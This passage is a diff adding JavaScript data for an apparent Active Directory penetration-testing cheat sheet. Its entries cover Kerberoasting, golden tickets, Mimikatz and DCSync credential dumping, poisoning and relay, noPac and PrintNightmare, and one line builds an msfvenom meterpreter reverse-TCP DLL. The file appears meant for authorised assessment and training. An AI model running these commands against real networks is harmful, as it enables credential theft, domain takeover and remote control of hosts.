+{tabs:['kerb'], section:'Windows — Rubeus', os:'Windows', tool:'Rubeus', cmd:'.\\Rubeus.exe asreproast /user:<user> /nowrap /format:hashcat', purpose:'AS-REP roast one account in hashcat format.'},
+{tabs:['kerb'], section:'Windows — Rubeus', os:'Windows', tool:'Rubeus', cmd:'.\\Rubeus.exe asktgt /user:<machine>$ /certificate:<base64> /ptt', purpose:'Exchange a certificate for a TGT and load it into memory.'},
+{tabs:['kerb'], section:'Windows — Rubeus', os:'Windows', tool:'Rubeus', cmd:'.\\Rubeus.exe golden /rc4:<hash> /domain:<domain> /sid:<sid> /sids:<sid> /user:<user>', purpose:'Forge a golden ticket with extra SIDs for a parent domain.'},
+{tabs:['kerb'], section:'Windows — Rubeus', os:'Windows', tool:'PowerView', cmd:'Get-DomainUser -Identity <user> | Get-DomainSPNTicket -Format Hashcat', purpose:'Kerberoast one account with PowerView.'},
+{tabs:['kerb'], section:'Windows — Rubeus', os:'Windows', tool:'PowerView', cmd:'Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\\tgs.csv -NoTypeInformation', purpose:'Export every TGS hash to a CSV file.'},
+{tabs:['kerb'], section:'Windows — Rubeus', os:'Windows', tool:'PowerView', cmd:'Get-DomainUser <user> -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes', purpose:'Check which encryption types an account supports.'},
+
+/* ---- Linux — Impacket & Kerbrute ---- */
+{tabs:['kerb'], section:'Linux — Impacket & Kerbrute', os:'Linux', tool:'GetUserSPNs.py', cmd:'GetUserSPNs.py -dc-ip <dc> <domain>/<user>', purpose:'List Kerberoastable SPN accounts.'},
+{tabs:['kerb'], section:'Linux — Impacket & Kerbrute', os:'Linux', tool:'GetUserSPNs.py', cmd:'GetUserSPNs.py -dc-ip <dc> <domain>/<user> -request', purpose:'Request TGS hashes for every SPN account.'},
+{tabs:['kerb'], section:'Linux — Impacket & Kerbrute', os:'Linux', tool:'GetUserSPNs.py', cmd:'GetUserSPNs.py -dc-ip <dc> <domain>/<user> -request-user <account> -outputfile <file>', purpose:'Request and save one TGS hash.'},
+{tabs:['kerb'], section:'Linux — Impacket & Kerbrute', os:'Linux', tool:'GetUserSPNs.py', cmd:'GetUserSPNs.py -target-domain <domain> <domain>/<user>', purpose:'List SPNs in a trusted domain.'},
+{tabs:['kerb'], section:'Linux — Impacket & Kerbrute', os:'Linux', tool:'GetUserSPNs.py', cmd:'GetUserSPNs.py -request -target-domain <domain> <domain>/<user>', purpose:'Request hashes across a domain trust.'},
+{tabs:['kerb'], section:'Linux — Impacket & Kerbrute', os:'Linux', tool:'GetNPUsers.py', cmd:'GetNPUsers.py <domain>/ -dc-ip <dc> -no-pass -usersfile <file>', purpose:'AS-REP roast users with pre-authentication disabled.'},
+{tabs:['kerb'], section:'Linux — Impacket & Kerbrute', os:'Linux', tool:'Kerbrute', cmd:'kerbrute userenum -d <domain> --dc <dc> <userlist> -o <out>', purpose:'Enumerate valid users through Kerberos pre-authentication.'},
+{tabs:['kerb'], section:'Linux — Impacket & Kerbrute', os:'Linux', tool:'Kerbrute', cmd:'kerbrute passwordspray -d <domain> --dc <dc> <userlist> <password>', purpose:'Spray one password across the user list.'},
+{tabs:['kerb'], section:'Linux — Impacket & Kerbrute', os:'Linux', tool:'ticketer.py', cmd:'ticketer.py -nthash <hash> -domain <domain> -domain-sid <sid> -extra-sid <sid> <user>', purpose:'Forge a golden ticket for a child-to-parent attack.'},
+{tabs:['kerb'], section:'Linux — Impacket & Kerbrute', os:'Linux', tool:'gettgtpkinit.py', cmd:'gettgtpkinit.py <domain>/<machine>$ -pfx-base64 <base64> <out.ccache>', purpose:'Request a TGT from a PFX certificate.'},
+{tabs:['kerb'], section:'Linux — Impacket & Kerbrute', os:'Linux', tool:'getnthash.py', cmd:'getnthash.py -key <key> <domain>/<machine>$', purpose:'Recover a machine account NT hash from a TGT.'},
+{tabs:['kerb'], section:'Linux — Impacket & Kerbrute', os:'Linux', tool:'Kerberos', cmd:'export KRB5CCNAME=<file>.ccache', purpose:'Point Impacket at a saved ticket cache.'},
+{tabs:['kerb'], section:'Linux — Impacket & Kerbrute', os:'Linux', tool:'klist', cmd:'klist', purpose:'List the tickets held in the current ccache.'},
+
+/* ================= AD TOOLKIT — Credential Access ================= */
+/* ---- Windows — Mimikatz & ACL abuse ---- */
+{tabs:['creds'], section:'Windows — Mimikatz & ACL abuse', os:'Windows', tool:'Mimikatz', cmd:'.\\mimikatz.exe', purpose:'Start Mimikatz.', admin:true},
+{tabs:['creds'], section:'Windows — Mimikatz & ACL abuse', os:'Windows', tool:'Mimikatz', cmd:'privilege::debug', purpose:'Acquire SeDebugPrivilege before reading credential material.', admin:true},
+{tabs:['creds'], section:'Windows — Mimikatz & ACL abuse', os:'Windows', tool:'Mimikatz', cmd:'sekurlsa::logonpasswords', purpose:'Dump logon passwords and hashes from LSASS.', admin:true},
+{tabs:['creds'], section:'Windows — Mimikatz & ACL abuse', os:'Windows', tool:'Mimikatz', cmd:'lsadump::dcsync /domain:<domain> /user:<domain>\\<user>', purpose:'Replicate the secrets of one account from the domain controller.'},
+{tabs:['creds'], section:'Windows — Mimikatz & ACL abuse', os:'Windows', tool:'Mimikatz', cmd:'lsadump::dcsync /user:<domain>\\krbtgt', purpose:'DCSync the krbtgt account.'},
+{tabs:['creds'], section:'Windows — Mimikatz & ACL abuse', os:'Windows', tool:'Mimikatz', cmd:'lsadump::dcsync /user:<domain>\\<user> /domain:<domain>', purpose:'DCSync an account in another domain.'},
+{tabs:['creds'], section:'Windows — Mimikatz & ACL abuse', os:'Windows', tool:'Mimikatz', cmd:'kerberos::list /export', purpose:'Export cached Kerberos tickets to disk.'},
+{tabs:['creds'], section:'Windows — Mimikatz & ACL abuse', os:'Windows', tool:'Mimikatz', cmd:'base64 /out:true', purpose:'Switch Mimikatz output to base64 for transport.'},
+{tabs:['creds'], section:'Windows — Mimikatz & ACL abuse', os:'Windows', tool:'Mimikatz', cmd:'kerberos::golden /user:<user> /domain:<domain> /sid:<sid> /krbtgt:<hash> /ptt', purpose:'Forge and load a golden ticket.'},
+{tabs:['creds'], section:'Windows — Mimikatz & ACL abuse', os:'Windows', tool:'Mimikatz', cmd:'.\\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit', purpose:'Run the credential dump as a single command.', admin:true},
+{tabs:['creds'], section:'Windows — Mimikatz & ACL abuse', os:'Windows', tool:'runas', cmd:'.\\runas.exe /netonly /user:<domain>\\<user> cmd.exe', purpose:'Start a shell that uses alternate credentials for network access.'},
+{tabs:['creds'], section:'Windows — Mimikatz & ACL abuse', os:'Windows', tool:'AD module', cmd:"Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl", purpose:'Find accounts with reversible encryption enabled.', rsat:true},
+{tabs:['creds'], section:'Windows — Mimikatz & ACL abuse', os:'Windows', tool:'PowerView', cmd:"Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | select samaccountname,useraccountcontrol", purpose:'Same reversible-encryption check with PowerView.'},
+{tabs:['creds'], section:'Windows — Mimikatz & ACL abuse', os:'Windows', tool:'PowerShell', cmd:"$SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force", purpose:'Build a SecureString for a credential object.'},
+{tabs:['creds'], section:'Windows — Mimikatz & ACL abuse', os:'Windows', tool:'PowerShell', cmd:"$Cred = New-Object System.Management.Automation.PSCredential('<domain>\\<user>', $SecPassword)", purpose:'Wrap the SecureString in a PSCredential for -Credential parameters.'},
+{tabs:['creds'], section:'Windows — Mimikatz & ACL abuse', os:'Windows', tool:'PowerView', cmd:'Set-DomainUserPassword -Identity <user> -AccountPassword $pass -Credential $Cred -Verbose', purpose:'Reset a password using delegated ACL rights.'},
+{tabs:['creds'], section:'Windows — Mimikatz & ACL abuse', os:'Windows', tool:'PowerView', cmd:"Add-DomainGroupMember -Identity '<group>' -Members '<user>' -Credential $Cred2 -Verbose", purpose:'Add a controlled account to a group using delegated rights.'},
+{tabs:['creds'], section:'Windows — Mimikatz & ACL abuse', os:'Windows', tool:'PowerView', cmd:"Remove-DomainGroupMember -Identity '<group>' -Members '<user>' -Credential $Cred2 -Verbose", purpose:'Remove the account and clean up afterwards.'},
+{tabs:['creds'], section:'Windows — Mimikatz & ACL abuse', os:'Windows', tool:'PowerView', cmd:"Set-DomainObject -Credential $Cred2 -Identity <user> -SET @{serviceprincipalname='<spn>'} -Verbose", purpose:'Write a fake SPN to make an account Kerberoastable.'},
+{tabs:['creds'], section:'Windows — Mimikatz & ACL abuse', os:'Windows', tool:'PowerView', cmd:'Set-DomainObject -Credential $Cred2 -Identity <user> -Clear serviceprincipalname -Verbose', purpose:'Remove the fake SPN afterwards.'},
+
+/* ---- Linux — secretsdump & GPP ---- */
+{tabs:['creds'], section:'Linux — secretsdump & GPP', os:'Linux', tool:'secretsdump.py', cmd:'secretsdump.py -outputfile <name> -just-dc <domain>/<user>@<dc>', purpose:'DCSync every domain secret to files.'},
+{tabs:['creds'], section:'Linux — secretsdump & GPP', os:'Linux', tool:'secretsdump.py', cmd:'secretsdump.py -just-dc-user <domain>/<user> -k -no-pass "<machine>$"@<dc>', purpose:'DCSync one account using a cached ticket.'},
+{tabs:['creds'], section:'Linux — secretsdump & GPP', os:'Linux', tool:'secretsdump.py', cmd:'secretsdump.py <domain>/<user>@<dc> -just-dc-user <domain>/krbtgt', purpose:'DCSync only the krbtgt hash.'},
+{tabs:['creds'], section:'Linux — secretsdump & GPP', os:'Linux', tool:'secretsdump.py', cmd:'secretsdump.py -just-dc-user <domain>/administrator "<machine>$"@<dc> -hashes <hash>', purpose:'DCSync with a machine account hash.'},
+{tabs:['creds'], section:'Linux — secretsdump & GPP', os:'Linux', tool:'secretsdump.py', cmd:'ls <name>_hashes*', purpose:'List the files secretsdump wrote.'},
+{tabs:['creds'], section:'Linux — secretsdump & GPP', os:'Linux', tool:'secretsdump.py', cmd:'cat <name>.ntds.cleartext', purpose:'Read cleartext passwords recovered from reversible encryption.'},
+{tabs:['creds'], section:'Linux — secretsdump & GPP', os:'Linux', tool:'gpp-decrypt', cmd:'gpp-decrypt <cpassword>', purpose:'Decrypt a cpassword copied from a Group Policy Preferences file.'},
+{tabs:['creds'], section:'Linux — secretsdump & GPP', os:'Linux', tool:'CrackMapExec', cmd:'crackmapexec smb -L | grep gpp', purpose:'Find the GPP modules shipped with CrackMapExec.'},
+{tabs:['creds'], section:'Linux — secretsdump & GPP', os:'Linux', tool:'CrackMapExec', cmd:'crackmapexec smb <dc> -u <user> -p <password> -M gpp_autologin', purpose:'Pull GPP autologin credentials from SYSVOL.'},
+{tabs:['creds'], section:'Linux — secretsdump & GPP', os:'Linux', tool:'lookupsid.py', cmd:'lookupsid.py <domain>/<user>@<dc>', purpose:'Brute-force account RIDs through SID lookups.'},
+{tabs:['creds'], section:'Linux — secretsdump & GPP', os:'Linux', tool:'lookupsid.py', cmd:'lookupsid.py <domain>/<user>@<dc> | grep "Domain SID"', purpose:'Extract the domain SID.'},
+{tabs:['creds'], section:'Linux — secretsdump & GPP', os:'Linux', tool:'lookupsid.py', cmd:'lookupsid.py <domain>/<user>@<dc> | grep -B12 "Enterprise Admins"', purpose:'Find the Enterprise Admins RID.'},
+{tabs:['creds'], section:'Linux — secretsdump & GPP', os:'Linux', tool:'kirbi2john.py', cmd:'python2.7 kirbi2john.py <file>.kirbi', purpose:'Convert an exported ticket into a hashcat input.'},
+
+/* ================= AD TOOLKIT — Execution & Lateral Movement ================= */
+/* ---- Windows — WinRM & MSSQL ---- */
+{tabs:['exec'], section:'Windows — WinRM & MSSQL', os:'Windows', tool:'PowerShell', cmd:'Enter-PSSession -ComputerName <host> -Credential <domain>\\<user>', purpose:'Open an interactive WinRM session.'},
+{tabs:['exec'], section:'Windows — WinRM & MSSQL', os:'Windows', tool:'PowerShell', cmd:'Register-PSSessionConfiguration -Name <name> -RunAsCredential <domain>\\<user>', purpose:'Register a session configuration that avoids the double-hop problem.', admin:true},
+{tabs:['exec'], section:'Windows — WinRM & MSSQL', os:'Windows', tool:'PowerShell', cmd:'Enter-PSSession -ComputerName <host> -Credential <domain>\\<user> -ConfigurationName <name>', purpose:'Connect through the custom session configuration.'},
+{tabs:['exec'], section:'Windows — WinRM & MSSQL', os:'Windows', tool:'PowerUpSQL', cmd:'Import-Module .\\PowerUpSQL.ps1', purpose:'Load PowerUpSQL.'},
+{tabs:['exec'], section:'Windows — WinRM & MSSQL', os:'Windows', tool:'PowerUpSQL', cmd:'Get-SQLInstanceDomain', purpose:'Discover MSSQL instances registered in the domain.'},
+{tabs:['exec'], section:'Windows — WinRM & MSSQL', os:'Windows', tool:'PowerUpSQL', cmd:'Get-SQLQuery -Verbose -Instance "<host>,1433" -username "<domain>\\<user>" -password "<password>" -query \'Select @@version\'', purpose:'Run a query against a discovered instance.'},
+{tabs:['exec'], section:'Windows — WinRM & MSSQL', os:'Windows', tool:'tasklist', cmd:'tasklist /V | findstr <user>', purpose:'Find processes running as a specific user.'},
+
+/* ---- Linux — Impacket & Evil-WinRM ---- */
+{tabs:['exec'], section:'Linux — Impacket & Evil-WinRM', os:'Linux', tool:'psexec.py', cmd:'psexec.py <domain>/<user>:<password>@<host>', purpose:'Get a semi-interactive SYSTEM shell over SMB.'},
+{tabs:['exec'], section:'Linux — Impacket & Evil-WinRM', os:'Linux', tool:'psexec.py', cmd:'psexec.py <domain>/<user>@<host> -k -no-pass -target-ip <ip>', purpose:'Run psexec with a cached ticket.'},
+{tabs:['exec'], section:'Linux — Impacket & Evil-WinRM', os:'Linux', tool:'wmiexec.py', cmd:'wmiexec.py <domain>/<user>:<password>@<host>', purpose:'Execute commands over WMI.'},
+{tabs:['exec'], section:'Linux — Impacket & Evil-WinRM', os:'Linux', tool:'mssqlclient.py', cmd:'mssqlclient.py <domain>/<user>@<host> -windows-auth', purpose:'Connect to MSSQL with Windows authentication.'},
+{tabs:['exec'], section:'Linux — Impacket & Evil-WinRM', os:'Linux', tool:'mssqlclient.py', cmd:'mssqlclient.py', purpose:'Show mssqlclient usage and options.'},
+{tabs:['exec'], section:'Linux — Impacket & Evil-WinRM', os:'Linux', tool:'mssqlclient.py', cmd:'enable_xp_cmdshell', purpose:'Enable OS command execution from the SQL session.'},
+{tabs:['exec'], section:'Linux — Impacket & Evil-WinRM', os:'Linux', tool:'mssqlclient.py', cmd:'xp_cmdshell whoami /priv', purpose:'Run a command through xp_cmdshell.'},
+{tabs:['exec'], section:'Linux — Impacket & Evil-WinRM', os:'Linux', tool:'smbserver.py', cmd:'smbserver.py -smb2support <share> <path>', purpose:'Host an SMB share for payloads and file transfer.'},
+{tabs:['exec'], section:'Linux — Impacket & Evil-WinRM', os:'Linux', tool:'evil-winrm', cmd:'evil-winrm -i <host> -u <user> -p <password>', purpose:'Open a WinRM shell with credentials.'},
+{tabs:['exec'], section:'Linux — Impacket & Evil-WinRM', os:'Linux', tool:'evil-winrm', cmd:'evil-winrm -i <host> -u <user> -H <hash>', purpose:'Open a WinRM shell with pass-the-hash.'},
+{tabs:['exec'], section:'Linux — Impacket & Evil-WinRM', os:'Linux', tool:'evil-winrm', cmd:'gem install evil-winrm', purpose:'Install Evil-WinRM from RubyGems.'},
+{tabs:['exec'], section:'Linux — Impacket & Evil-WinRM', os:'Linux', tool:'raiseChild.py', cmd:'raiseChild.py -target-exec <dc> <domain>/<user>', purpose:'Automate child-to-parent domain escalation.'},
+{tabs:['exec'], section:'Linux — Impacket & Evil-WinRM', os:'Linux', tool:'rpcdump.py', cmd:"rpcdump.py @<host> | egrep 'MS-RPRN|MS-PAR'", purpose:'Check whether the print spooler RPC interfaces are exposed.'},
+
+/* ================= AD TOOLKIT — Poisoning, Relay & Coercion ================= */
+/* ---- Windows — Inveigh ---- */
+{tabs:['relay'], section:'Windows — Inveigh', os:'Windows', tool:'Inveigh', cmd:'Import-Module .\\Inveigh.ps1', purpose:'Load the PowerShell version of Inveigh.'},
+{tabs:['relay'], section:'Windows — Inveigh', os:'Windows', tool:'Inveigh', cmd:'(Get-Command Invoke-Inveigh).Parameters', purpose:'List the parameters Invoke-Inveigh accepts.'},
+{tabs:['relay'], section:'Windows — Inveigh', os:'Windows', tool:'Inveigh', cmd:'Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y', purpose:'Start LLMNR, NBT-NS and mDNS spoofing.', admin:true},
+{tabs:['relay'], section:'Windows — Inveigh', os:'Windows', tool:'Inveigh', cmd:'.\\Inveigh.exe', purpose:'Start the C# console version with its semi-interactive prompt.', admin:true},
+{tabs:['relay'], section:'Windows — Inveigh', os:'Windows', tool:'SecurityAssessment', cmd:'Import-Module .\\SecurityAssessment.ps1', purpose:'Load the printer and spooler assessment helpers.'},
+{tabs:['relay'], section:'Windows — Inveigh', os:'Windows', tool:'SecurityAssessment', cmd:'Get-SpoolStatus -ComputerName <dc>', purpose:'Check whether the print spooler is reachable for coercion.'},
+
+/* ---- Linux — Responder, relay & coercion ---- */
+{tabs:['relay'], section:'Linux — Responder, relay & coercion', os:'Linux', tool:'Responder', cmd:'sudo responder -I <interface> -wrf', purpose:'Start Responder with WPAD, proxy auth and fingerprinting.', admin:true},
+{tabs:['relay'], section:'Linux — Responder, relay & coercion', os:'Linux', tool:'Responder', cmd:'responder -h', purpose:'Show Responder options.'},
+{tabs:['relay'], section:'Linux — Responder, relay & coercion', os:'Linux', tool:'ntlmrelayx.py', cmd:'sudo ntlmrelayx.py -debug -smb2support --target http://<ca>/certsrv/certfnsh.asp --adcs --template DomainController', purpose:'Relay coerced authentication to ADCS and request a DC certificate.', admin:true},
+{tabs:['relay'], section:'Linux — Responder, relay & coercion', os:'Linux', tool:'PetitPotam.py', cmd:'python3 PetitPotam.py <listener-ip> <dc-ip>', purpose:'Coerce the domain controller to authenticate to the listener.'},
+{tabs:['relay'], section:'Linux — Responder, relay & coercion', os:'Linux', tool:'noPac.py', cmd:'sudo python3 scanner.py <domain>/<user>:<password> -dc-ip <dc> -use-ldap', purpose:'Scan for the noPac vulnerabilities.', admin:true},
+{tabs:['relay'], section:'Linux — Responder, relay & coercion', os:'Linux', tool:'noPac.py', cmd:'sudo python3 noPac.py <domain>/<user>:<password> -dc-ip <dc> -dc-host <dc-host> -shell --impersonate administrator -use-ldap', purpose:'Get a shell as Domain Admin through noPac.', admin:true},
+{tabs:['relay'], section:'Linux — Responder, relay & coercion', os:'Linux', tool:'noPac.py', cmd:'sudo python3 noPac.py <domain>/<user>:<password> -dc-ip <dc> -dc-host <dc-host> --impersonate administrator -use-ldap -dump -just-dc-user administrator', purpose:'DCSync the administrator account through noPac.', admin:true},
+{tabs:['relay'], section:'Linux — Responder, relay & coercion', os:'Linux', tool:'CVE-2021-1675.py', cmd:"sudo python3 CVE-2021-1675.py <domain>/<user>:<password>@<dc> '\\\\<listener>\\<share>\\<payload>.dll'", purpose:'Trigger PrintNightmare with a hosted DLL.', admin:true},
+{tabs:['relay'], section:'Linux — Responder, relay & coercion', os:'Linux', tool:'msfvenom', cmd:'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f dll > <payload>.dll', purpose:'Build the DLL payload PrintNightmare will load.'},
+
+/* ================= AD TOOLKIT — Offline Cracking ================= */
+{tabs:['crack'], section:'Linux — Hashcat & hash preparation', os:'Linux', tool:'Hashcat', cmd:'hashcat -m 5600 <hashfile> <wordlist>', purpose:'Crack a NetNTLMv2 hash.'},
+{tabs:['crack'], section:'Linux — Hashcat & hash preparation', os:'Linux', tool:'Hashcat', cmd:'hashcat -m 13100 <hashfile> <wordlist>', purpose:'Crack a Kerberoast TGS hash for RC4 accounts.'},
+{tabs:['crack'], section:'Linux — Hashcat & hash preparation', os:'Linux', tool:'Hashcat', cmd:'hashcat -m 19700 <hashfile> <wordlist>', purpose:'Crack a Kerberoast hash for AES-enabled accounts.'},
+{tabs:['crack'], section:'Linux — Hashcat & hash preparation', os:'Linux', tool:'Hashcat', cmd:'hashcat -m 18200 <hashfile> <wordlist>', purpose:'Crack an AS-REP hash.'},
+{tabs:['crack'], section:'Linux — Hashcat & hash preparation', os:'Linux', tool:'Hashcat', cmd:"sed 's/\\$krb5tgs\\$\\(.*\\):\\(.*\\)/\\$krb5tgs\\$23\\$\\*\\1\\*\\$\\2/' <in> > <out>", purpose:'Rewrite a kirbi2john hash into hashcat krb5tgs format.'},
+{tabs:['crack'], section:'Linux — Hashcat & hash preparation', os:'Linux', tool:'Hashcat', cmd:'cat <hashfile>', purpose:'Inspect the hash before feeding it to hashcat.'},
+
+/* ================= AD TOOLKIT — Auditing & Reporting ================= */
+{tabs:['audit'], section:'Windows — Audit & reporting', os:'Windows', tool:'ADRecon', cmd:'.\\ADRecon.ps1', purpose:'Collect AD data into an Excel or HTML report.'},
+{tabs:['audit'], section:'Windows — Audit & reporting', os:'Windows', tool:'PingCastle', cmd:'PingCastle.exe --help', purpose:'Show PingCastle options.'},
+{tabs:['audit'], section:'Windows — Audit & reporting', os:'Windows', tool:'PingCastle', cmd:'PingCastle.exe', purpose:'Launch the interactive PingCastle menu.'},
+{tabs:['audit'], section:'Windows — Audit & reporting', os:'Windows', tool:'Group3r', cmd:'group3r.exe -f <logfile>', purpose:'Audit GPO settings and permissions.'},
+{tabs:['audit'], section:'Windows — Audit & reporting', os:'Windows', tool:'LAPSToolkit', cmd:'Find-LAPSDelegatedGroups', purpose:'List groups delegated to read LAPS passwords.'},
+{tabs:['audit'], section:'Windows — Audit & reporting', os:'Windows', tool:'LAPSToolkit', cmd:'Find-AdmPwdExtendedRights', purpose:'Find extended rights over LAPS passwords.'},
+{tabs:['audit'], section:'Windows — Audit & reporting', os:'Windows', tool:'LAPSToolkit', cmd:'Get-LAPSComputers', purpose:'List computers with a LAPS-managed password.'}
+];
+
+const TOOLS = [
+  {name:'PowerView / SharpView', os:'Windows', desc:'Situational awareness for AD. PowerView is PowerShell; SharpView is the .NET port.'},
+  {name:'BloodHound', os:'Both', desc:'Graph analysis of AD relationships and attack paths.'},
+  {name:'SharpHound', os:'Windows', desc:'The C# collector that produces the JSON BloodHound ingests.'},
+  {name:'BloodHound.py', os:'Linux', desc:'Python ingestor for a non-domain-joined Linux attack host.'},
+  {name:'Kerbrute', os:'Linux', desc:'Kerberos pre-authentication user enumeration and password spraying.'},
+  {name:'Impacket toolkit', os:'Linux', desc:'Python implementations of SMB, MSRPC, Kerberos and related protocols.'},
+  {name:'Responder', os:'Linux', desc:'LLMNR, NBT-NS and mDNS poisoner with built-in capture servers.'},
+  {name:'Inveigh.ps1', os:'Windows', desc:'PowerShell network spoofing and poisoning.'},
+  {name:'C# Inveigh', os:'Windows', desc:'InveighZero console version with a semi-interactive hash viewer.'},
+  {name:'rpcinfo', os:'Linux', desc:'Query RPC program status and list remote RPC services.'},
+  {name:'rpcclient', os:'Linux', desc:'Samba client for AD enumeration over MSRPC.'},
+  {name:'CrackMapExec', os:'Linux', desc:'Enumeration and attack toolkit over SMB, WMI, WinRM and MSSQL.'},
+  {name:'Rubeus', os:'Windows', desc:'C# toolkit for Kerberos abuse and ticket manipulation.'},
+  {name:'GetUserSPNs.py', os:'Linux', desc:'Find and request Kerberoastable service tickets.'},
+  {name:'Hashcat', os:'Both', desc:'Offline hash and password cracking.'},
+  {name:'enum4linux', os:'Linux', desc:'Enumerate Windows and Samba systems over SMB and RPC.'},
+  {name:'enum4linux-ng', os:'Linux', desc:'Rewrite of enum4linux with structured JSON and YAML output.'},
+  {name:'ldapsearch', os:'Linux', desc:'Command-line LDAP query tool.'},
+  {name:'windapsearch', os:'Linux', desc:'Python LDAP enumeration for users, groups and computers.'},
+  {name:'DomainPasswordSpray.ps1', os:'Windows', desc:'PowerShell password spraying against domain users.'},
+  {name:'LAPSToolkit', os:'Windows', desc:'Audit and attack LAPS deployments; builds on PowerView.'},
+  {name:'smbmap', os:'Linux', desc:'SMB share enumeration and permission mapping.'},
+  {name:'psexec.py', os:'Linux', desc:'PsExec-style semi-interactive shell over SMB.'},
+  {name:'wmiexec.py', os:'Linux', desc:'Command execution over WMI.'},
+  {name:'Snaffler', os:'Windows', desc:'Find credentials and interesting files on readable shares.'},
+  {name:'smbserver.py', os:'Linux', desc:'Host an SMB share for payloads and file transfer.'},
+  {name:'setspn.exe', os:'Windows', desc:'Read and modify Service Principal Names.'},
+  {name:'Mimikatz', os:'Windows', desc:'Credential, ticket and hash extraction from Windows memory.'},
+  {name:'secretsdump.py', os:'Linux', desc:'Dump SAM, LSA secrets and NTDS.dit remotely.'},
+  {name:'evil-winrm', os:'Linux', desc:'Interactive WinRM shell, with pass-the-hash support.'},
+  {name:'mssqlclient.py', os:'Linux', desc:'Interactive MSSQL client with Windows authentication.'},
+  {name:'noPac.py', os:'Linux', desc:'CVE-2021-42278 and CVE-2021-42287 chain to Domain Admin.'},
+  {name:'rpcdump.py', os:'Linux', desc:'RPC endpoint mapper.'},
+  {name:'CVE-2021-1675.py', os:'Linux', desc:'PrintNightmare proof of concept.'},
+  {name:'ntlmrelayx.py', os:'Linux', desc:'SMB and HTTP relay attacks, including ADCS certificate requests.'},
+  {name:'PetitPotam.py', os:'Linux', desc:'CVE-2021-36942 coercion through MS-EFSRPC.'},
+  {name:'gettgtpkinit.py', os:'Linux', desc:'Request a TGT from a certificate using PKINIT.'},
+  {name:'getnthash.py', os:'Linux', desc:'Recover an NT hash from a TGT through a U2U PAC request.'},
+  {name:'adidnsdump', os:'Linux', desc:'Dump AD-integrated DNS records like a zone transfer.'},
+  {name:'gpp-decrypt', os:'Linux', desc:'Decrypt Group Policy Preferences cpasswords.'},
+  {name:'GetNPUsers.py', os:'Linux', desc:'AS-REP roast accounts without Kerberos pre-authentication.'},
+  {name:'lookupsid.py', os:'Linux', desc:'SID brute-forcing to enumerate accounts and groups.'},
+  {name:'ticketer.py', os:'Linux', desc:'Create and customise TGT/TGS tickets, including golden tickets.'},
+  {name:'raiseChild.py', os:'Linux', desc:'Automated child-to-parent domain privilege escalation.'},
+  {name:'Active Directory Explorer', os:'Windows', desc:'AD viewer and editor, with offline snapshot support.'},
+  {name:'PingCastle', os:'Windows', desc:'AD security audit scored against a maturity framework.'},
+  {name:'Group3r', os:'Windows', desc:'Audit GPO settings and permissions for misconfigurations.'},
+  {name:'ADRecon', os:'Windows', desc:'Extract AD data into Excel or HTML reports.'}
+];
+
+const WORKFLOWS = [
+  {
+    title:'CMD — Basic host and domain enumeration',
+    desc:'Run in order on a host you are authorized to assess.',
+    commands:[
+      'whoami /all',
+      'hostname',
+      'systeminfo',
+      'ipconfig /all',
+      'nltest /dsgetdc:<domain>',
+      'nltest /domain_trusts',
+      'net user /domain',
+      'net group "Domain Admins" /domain',
+      'netstat -ano',
+      'sc.exe query',
+      'schtasks /query /fo LIST /v',
+      'gpresult /r'
+    ]
+  },
+  {
+    title:'PowerShell — Basic host enumeration',
+    desc:'Cmdlet-only pass over the same host.',
+    commands:[
+      'Get-CimInstance Win32_OperatingSystem',
+      'Get-CimInstance Win32_ComputerSystem',
+      'Get-Process',
+      'Get-Service',
+      'Get-CimInstance Win32_Service',
+      'Get-ScheduledTask',
+      'Get-HotFix',
+      'Get-NetTCPConnection',
+      'Get-NetFirewallProfile',
+      'Get-MpComputerStatus'
+    ]
+  }
+];
+
+const NOTES = [
+  'Use these commands only on systems you own or are explicitly authorized to assess.',
+  'Output can vary by Windows version, domain configuration, policy, and user privileges.',
+  'Active Directory Get-AD* commands require the Active Directory PowerShell module (commonly installed through RSAT).',
+  'Get-GPO requires the GroupPolicy PowerShell module.',
+  'AD cmdlets and net.exe domain queries only return objects the current account is permitted to read — missing output is not proof the object does not exist.',
+  'Some commands or returned details require elevated permissions or specific Windows features.',
+  'Enumeration output is evidence for investigation; it does not by itself prove a vulnerability.',
+  'Do not collect, expose, or reuse credentials, tickets, or tokens outside the approved scope.',
+  'The AD Toolkit chapter covers third-party tools. Flags change between versions — check the installed help when syntax fails.',
+  'Passwords, hashes and ticket blobs in the source material were replaced with placeholders. Substitute values from your own authorized engagement.',
+  'Replace placeholders such as <username>, <host>, <domain>, <service>, <path>, and <port> with appropriate values.'
+];
+/* DATA-END */
+
+/* ------------------------------------------------------------------ */
+/*  Chapter structure                                                  */
+/* ------------------------------------------------------------------ */
+const CHAPTERS = [
+  {
+    id:'cmd', tab:'cmd', num:'01', kicker:'Command line', title:'Command Prompt', track:'win',
+    intro:'The commands that ship with every Windows install. Start here when you have nothing but a shell: identity, local accounts, network discovery, services and permissions.',
+    tip:'Most of these are read-only queries. Run elevated only where a result is truncated, such as some audit and security detail.',
+    sections:[
+      {id:'cmd-system', title:'System & Identity', key:'System & Identity'},
+      {id:'cmd-users', title:'Users & Groups', key:'Users & Groups'},
+      {id:'cmd-network', title:'Network & Domain Discovery', key:'Network & Domain Discovery'},
+      {id:'cmd-services', title:'Services, Tasks & Permissions', key:'Services, Tasks & Permissions'},
+      {id:'cmd-security', title:'Kerberos, Credentials & Security', key:'Kerberos, Credentials & Security'}
+    ]
+  },
+  {
+    id:'powershell', tab:'powershell', num:'02', kicker:'Automation', title:'PowerShell', track:'win',
+    intro:'Object-based cmdlets that replace most legacy text parsing. Every example runs in a normal user session unless a badge says otherwise.',
+    tip:'Use Get-Help &lt;cmdlet&gt; -Examples to learn full syntax without leaving the shell.',
+    sections:[
+      {id:'ps-system', title:'System, Processes & Services', key:'System, Processes & Services'},
+      {id:'ps-network', title:'Network & Remote Management', key:'Network & Remote Management'},
+      {id:'ps-security', title:'Kerberos, Credentials & Security', key:'Kerberos, Credentials & Security',
